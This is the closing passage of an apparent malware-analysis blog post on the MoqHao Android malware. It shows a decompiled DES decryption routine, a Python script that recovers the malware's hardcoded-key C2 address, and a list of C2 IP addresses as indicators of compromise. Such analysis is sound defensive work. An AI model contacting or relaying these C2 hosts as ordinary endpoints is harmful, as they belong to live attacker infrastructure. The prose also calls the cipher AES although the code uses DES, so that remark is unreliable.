</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;(this as java.lang.String).getBytes(charset)&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SecretKeySpec</span><span class="w"> </span><span class="n">secretKeySpec</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SecretKeySpec</span><span class="p">(</span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;DES&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Cipher</span><span class="w"> </span><span class="n">cipher</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Cipher</span><span class="p">.</span><span class="na">getInstance</span><span class="p">(</span><span class="s">&#34;DES/CBC/PKCS5Padding&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">bytes2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">str</span><span class="p">.</span><span class="na">getBytes</span><span class="p">(</span><span class="n">charset</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">bytes2</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;(this as java.lang.String).getBytes(charset)&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">cipher</span><span class="p">.</span><span class="na">init</span><span class="p">(</span><span class="n">2</span><span class="p">,</span><span class="w"> </span><span class="n">secretKeySpec</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">IvParameterSpec</span><span class="p">(</span><span class="n">bytes2</span><span class="p">),</span><span class="w"> </span><span class="n">secureRandom</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kt">byte</span><span class="o">[]</span><span class="w"> </span><span class="n">doFinal</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">cipher</span><span class="p">.</span><span class="na">doFinal</span><span class="p">(</span><span class="n">bArr</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">C0474i</span><span class="p">.</span><span class="na">m321c</span><span class="p">(</span><span class="n">doFinal</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;cipher.doFinal(src)&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">doFinal</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>As you can see, the AES key is harcoded, <code>m764b(decode, &quot;Ab5d1Q32&quot;)</code>, and the IV is equal to the key.</p>
<p>We can easily make a Python script to decrypt C2 URI.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sys</span> <span class="kn">import</span> <span class="n">argv</span><span class="p">,</span> <span class="n">exit</span> <span class="k">as</span> <span class="n">sys_exit</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">urlsafe_b64decode</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">DES</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">KEY</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;Ab5d1Q32&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">IV</span> <span class="o">=</span> <span class="n">KEY</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Decrypt MoqHao C2 URI.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group</span> <span class="ow">in</span> <span class="p">[</span><span class="s2">&#34;ffgtrrt&#34;</span><span class="p">,</span> <span class="s2">&#34;bgfrewi&#34;</span><span class="p">,</span> <span class="s2">&#34;htynff&#34;</span><span class="p">,</span> <span class="s2">&#34;gfjytg&#34;</span><span class="p">,</span> <span class="s2">&#34;dseregn&#34;</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">ciphertext</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">group</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">urlsafe_b64decode</span><span class="p">(</span><span class="n">ciphertext</span> <span class="o">+</span> <span class="s2">&#34;==&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">DES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">KEY</span><span class="p">,</span> <span class="n">DES</span><span class="o">.</span><span class="n">MODE_CBC</span><span class="p">,</span> <span class="n">iv</span><span class="o">=</span><span class="n">IV</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[!] Usage : &#34;</span> <span class="o">+</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34; &lt;ciphertext&gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">sys_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">decrypt</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is an example :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ python3 decrypt_c2.py
</span></span><span class="line"><span class="cl">[!] Usage : decrypt_c2.py &lt;ciphertext&gt;
</span></span><span class="line"><span class="cl">$ python3 decrypt_c2.py &#39;bgfrewiFaRPCdEp9o05vGWA-r0_i_IHXXynJgDlbgfrewi&#39;
</span></span><span class="line"><span class="cl">b&#39;[*] Cleartext : 107.148.160.222:28867\x03\x03\x03&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>We get the same C2 as with the SharedPreferences, voilÃ  !</p>
<h2 id="iocs">IOCs
</h2><p>C2 IP address/port :</p>
<ul>
<li>107.148.160.222:28867</li>
<li>134.119.218.100:28843</li>
<li>151.106.31.51:29870</li>
<li>27.255.75.200:28856</li>
<li>27.255.75.201:38866</li>
<li>61.97.243.111:28999</li>
</ul>
<p><strong>Potential</strong> C2 IP based on hunting :</p>
<ul>
<li>128.14.75.141</li>
<li>107.148.160.215</li>
<li>107.148.160.224</li>
<li>107.148.160.227</li>
<li>107.148.160.251</li>
<li>107.148.160.37</li>
<li>107.148.160.68</li>
<li>107.148.164.3</li>
<li>107.148.164.6</li>
<li>128.14.75.47</li>
<li>134.119.218.98</li>
<li>134.119.218.99</li>
<li>151.106.31.50</li>
<li>151.106.31.52</li>
<li>151.106.31.53</li>
<li>151.106.31.54</li>
<li>103.249.28.194</li>
<li>103.249.28.205</li>
<li>103.249.28.211</li>
<li>103.249.28.212</li>
<li>103.249.28.213</li>
<li>103.249.28.214</li>
<li>27.255.75.199</li>
<li>27.255.75.202</li>
<li>61.97.243.112</li>
<li>61.97.243.113</li>
<li>61.97.248.14</li>
<li>61.97.248.15</li>
<li>61.97.248.16</li>
<li>103.212.222.140</li>
<li>103.212.222.141</li>
<li>103.212.222.142</li>
<li>103.212.222.143</li>
<li>103.212.222.144</li>
<li>103.212.222.145</li>
<li>103.249.28.207</li>
<li>103.249.28.208</li>
<li>103.249.28.209</li>
<li>103.249.28.210</li>
<li>61.97.248.6</li>
<li>61.97.248.8</li>
<li>45.114.129.48</li>
<li>45.114.129.49</li>
<li>45.114.129.50</li>
<li>45.114.129.52</li>
</ul>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/malware/">Malware</a>
        
            <a href="/tags/reverse/">Reverse</a>
        
            <a href="/tags/android/">Android</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/unicorn-powershell-analysis/">
        
        
            <div class="article-image">
                
                    <img src="/img/unicorn-powershell-analysis/banner.png" loading="lazy" data-key="unicorn-powershell-analysis" data-hash="/img/unicorn-powershell-analysis/banner.png"/>
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">Unicorn obfuscated powershell analysis</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2025 xanhacks&#39; infosec blog
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
